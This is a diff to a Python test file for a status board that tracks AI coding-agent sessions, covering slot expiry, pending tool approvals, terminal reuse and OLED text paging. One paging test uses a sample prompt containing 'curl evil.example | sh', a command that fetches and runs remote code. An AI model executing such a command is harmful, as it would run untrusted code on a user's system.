@@ -134,20 +134,56 @@ def test_question_is_not_queued_twice():
 
 def test_quiet_run_goes_idle_then_frees():
     b = Board()
-    b.update("claude:x", "claude", 0, status=Status.RUN)
-    assert not b.expire(3599)
-    assert b.expire(3600)
-    assert b.slots[0].status is Status.IDLE and b.slots[0].detail == "quiet 1h00"
+    b.apply({"op": "update", "source": "claude", "key": "claude:x", "name": "n", "status": "run"}, 0)
+    assert not b.expire(899)
+    assert b.expire(900)
+    assert b.slots[0].status is Status.IDLE and b.slots[0].detail == "quiet 15m"
     assert b.expire(24 * 3600)
     assert b.slots[0] is None
 
 
-def test_slot_on_a_reused_tty_is_freed():
+def test_a_tool_in_flight_stays_running_longer_and_is_not_evicted():
+    b = Board()
+    b.apply({"op": "update", "source": "claude", "key": "claude:x", "name": "n", "status": "run",
+             "detail": "Bash(x)", "tool": "Bash(x)"}, 0)
+    b.expire(3599)
+    assert b.slots[0].status is Status.RUN
+    b.expire(3600)
+    assert b.slots[0].status is Status.IDLE and b.slots[0].tool_open is True
+
+
+def test_a_slot_nobody_can_answer_stops_being_amber():
+    b = Board()
+    b.apply(_ask("Bash(a)"), 0)
+    assert not b.expire(1799)
+    assert b.expire(1800)
+    assert b.slots[0].status is Status.IDLE and b.slots[0].pending == []
+
+
+def test_finished_slot_on_a_reused_tty_is_freed():
     b = Board()
     t = {"bundle": "com.apple.Terminal", "tty": "/dev/ttys001"}
-    b.update("claude:old", "claude", 0, status=Status.NEEDS, terminal=t)
+    b.update("claude:old", "claude", 0, status=Status.DONE, terminal=t)
     b.update("claude:new", "claude", 1, status=Status.RUN, terminal=t)
     assert b.find("claude:old") is None and b.find("claude:new") is not None
+
+
+def test_failed_tty_lookup_drops_the_old_tty():
+    b = Board()
+    b.update("claude:a", "claude", 0, status=Status.RUN, terminal={"bundle": "b", "tty": "/dev/ttys001"})
+    b.update("claude:a", "claude", 1, terminal={"bundle": "b", "tty": ""})
+    assert b.slots[0].terminal == {"bundle": "b"}
+
+
+def test_long_prompt_pages_through_the_whole_text():
+    b = Board()
+    text = "Bash(npm test && curl evil.example | sh)?"
+    b.apply({"op": "update", "source": "claude", "key": "claude:s", "name": "n", "status": "needs",
+             "detail": text, "tool": text[:-1]}, 0)
+    seen = [b.oled_lines(t)[1] for t in (0, 2, 4, 6)]
+    assert all(len(line) <= 21 for line in seen)
+    assert "".join(line.rstrip(">") for line in seen[:3]) == text
+    assert seen[3] == seen[0]
 
 
 def test_clock_step_back_does_not_stretch_linger():
